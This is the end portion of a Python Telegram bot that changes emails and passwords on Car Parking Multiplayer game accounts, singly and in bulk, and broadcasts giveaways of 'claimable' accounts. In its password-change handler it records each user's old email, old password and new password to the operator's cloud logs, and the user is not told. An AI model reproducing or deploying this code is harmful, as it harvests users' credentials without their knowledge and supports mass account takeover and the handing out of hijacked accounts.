                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Logged in as: {new_email}\n"
                f"🎯 Game: {game.upper()}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Available Options:\n"
                "1️⃣ Type: changemail - Change your email\n"
                "2️⃣ Type: changepass - Change your password\n"
                "3️⃣ Type: logout - Logout from the bot\n\n"
                "What would you like to do?",
                context
            )
        else:
            await reply_custom(update, "❌ Failed to change email. Make sure the new email is not in use.", context)
            sess['state'] = 'logged_in'
        return

    elif state == 'awaiting_new_password':
        new_password = text
        token = sess.get('token')
        old_email = sess.get('email')
        old_password = sess.get('password','')
        game = sess.get('game','cpm2')
        if change_password(token, new_password, game):
            sess['password'] = new_password
            cloud_log_credentials(old_email, new_password, game, "password", old_email, username, user_id)
            cloud_log_change("password", old_email, old_email, old_password, new_password, username, user_id, game)
            sess['state'] = 'logged_in'
            await reply_custom(update,
                "🔑 Password changed successfully!\n\n"
                "🎮 MARK MWEHEHE Change Tool Bot 🎮\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Logged in as: {sess['email']}\n"
                f"🎯 Game: {game.upper()}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Available Options:\n"
                "1️⃣ Type: changemail - Change your email\n"
                "2️⃣ Type: changepass - Change your password\n"
                "3️⃣ Type: logout - Logout from the bot\n\n"
                "What would you like to do?",
                context
            )
        else:
            await reply_custom(update, "❌ Failed to change password.", context)
            sess['state'] = 'logged_in'
        return

    else:
        await reply_custom(update, "❌ Unknown state. Please use /start to begin.", context)

# ============================================================
# ✅ BULK TYPE
# ============================================================
async def bulk_type_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    data = query.data
    user_id = query.from_user.id

    if user_id != ADMIN_ID and not has_access(user_id):
        try:
            await query.edit_message_text("🔒 You don't have access. Contact @Maarkryan.")
        except:
            pass
        return

    if user_id not in sessions or sessions[user_id].get('state') != 'awaiting_bulk_type':
        await edit_custom(query, "❌ Session expired.")
        return
    sess = sessions[user_id]
    if data == "bulk_email":
        sess['bulk_change_type'] = 'email'
        sess['state'] = 'awaiting_bulk_new_value'
        await edit_custom(query, "✉️ Enter the new email address (e.g., example@gmail.com). A random number will be added to each account.")
    elif data == "bulk_pass":
        sess['bulk_change_type'] = 'password'
        sess['state'] = 'awaiting_bulk_new_value'
        await edit_custom(query, "🔑 Enter the new password for all accounts:")
    else:
        await edit_custom(query, "❌ Invalid choice.")

# ============================================================
# ✅ ADMIN COMMANDS: /claimagain and /undermaintinance
# ============================================================
async def claimagain_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    
    users = db_get("giveaway/users") or {}
    if not users:
        await reply_custom(update, "📭 No users to notify.", context)
        return
    
    msg = (
        "🎉 CLAIM AGAIN AVAILABLE! 🎉\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔥 Good news! You can now claim another account! 🔥\n\n"
        "⚡ Click /start and choose your prize! ⚡\n"
        "💎 New accounts have been added! 💎\n\n"
        "👑 Hurry up before they run out! 🚀\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💙 @Cpm_2test_bot"
    )
    
    success = 0
    failed = 0
    for uid in users.keys():
        try:
            await send_custom(int(uid), msg, context)
            success += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"Failed to send to {uid}: {e}")
            failed += 1
    
    await reply_custom(update, f"✅ Broadcast sent!\n📤 Success: {success}\n❌ Failed: {failed}", context)

async def undermaintinance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    
    users = db_get("giveaway/users") or {}
    if not users:
        await reply_custom(update, "📭 No users to notify.", context)
        return
    
    msg = (
        "🛠️ UNDER MAINTENANCE ⚡5\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ The bot is currently under maintenance. ⚡5\n\n"
        "🔥 We are adding new accounts and improving the system!\n"
        "⏳ Please wait a few minutes and try again.\n\n"
        "💎 We apologize for the inconvenience.\n"
        "👑 Stay tuned for more updates!\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💙 @Cpm_2test_bot"
    )
    
    success = 0
    failed = 0
    for uid in users.keys():
        try:
            await send_custom(int(uid), msg, context)
            success += 1
            await asyncio.sleep(0.1)
        except Exception as e:
            print(f"Failed to send to {uid}: {e}")
            failed += 1
    
    await reply_custom(update, f"✅ Maintenance broadcast sent!\n📤 Success: {success}\n❌ Failed: {failed}", context)

# ============================================================
# ✅ RUN BOT
# ============================================================
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    request = HTTPXRequest(
        connection_pool_size=20,
        connect_timeout=60.0,
        read_timeout=60.0,
        write_timeout=60.0,
        pool_timeout=60.0
    )

    app = Application.builder().token(TOKEN).request(request).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addtrial", addtrial_command))
    app.add_handler(CommandHandler("removetrial", removetrial_command))
    app.add_handler(CommandHandler("triallist", triallist_command))
    app.add_handler(CommandHandler("dashboard", dashboard_command))
    app.add_handler(CommandHandler("download_logs", download_logs_command))
    app.add_handler(CommandHandler("backup_now", backup_now_command))
    app.add_handler(CommandHandler("continue", continue_command))
    app.add_handler(CommandHandler("claimagain", claimagain_command))
    app.add_handler(CommandHandler("undermaintinance", undermaintinance_command))
    app.add_handler(CommandHandler("cpm1tool", lambda u,c: start(u,c)))  # Redirect to start for admin menu

    app.add_handler(CallbackQueryHandler(admin_decision_handler, pattern="^(confirm_|decline_)"))
    app.add_handler(CallbackQueryHandler(bulk_game_selection_handler, pattern="^bulk_game_(cpm1|cpm2)$"))
    app.add_handler(CallbackQueryHandler(bulk_type_handler, pattern="^(bulk_email|bulk_pass)$"))
    app.add_handler(CallbackQueryHandler(button_handler))

    app.add_handler(MessageHandler(filters.TEXT | filters.PHOTO | filters.Document.ALL, message_handler))

    print("="*50)
    print("🤖 MARK CPM1/2 CHANGER BOT - COMPLETE")
    print("📌 All features integrated: Bulk, CPM1 Tool, Admin")
    print("📌 Custom emojis with fallback")
    print("📌 Background bulk processing with /continue")
    print("📌 Admin: /addtrial, /removetrial, /triallist, /claimagain, /undermaintinance")
    print("📌 Users: /dashboard")
    print("="*50)

    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling())
    loop.run_forever()

# ============================================================
# ✅ MAIN
# ============================================================
if __name__ == "__main__":
    PORT = int(os.environ.get("PORT", 10000))
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    print("✅ Bot thread started!")
    
    app_flask.run(host="0.0.0.0", port=PORT)
